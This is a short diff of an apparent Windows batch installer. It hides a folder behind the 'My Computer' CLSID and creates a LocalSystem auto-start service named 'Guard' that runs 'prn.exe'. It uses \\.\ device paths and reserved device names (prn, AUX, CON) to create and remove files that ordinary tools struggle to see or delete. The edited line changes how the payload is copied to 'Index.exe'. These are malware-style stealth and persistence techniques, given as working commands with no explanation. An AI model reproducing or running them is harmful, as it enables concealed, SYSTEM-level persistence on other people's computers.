@@ -4,7 +4,7 @@ mkdir %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
 
 sc create Guard binPath="\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" start="auto" obj="LocalSystem"
 
-copy /Y "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe" "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe"
+copy /Y "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe" "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe"
 
 rd /S /Q \\.\%ProgramData%\AUX..\
 rd /S /Q \\.\%ProgramData%\CON..\
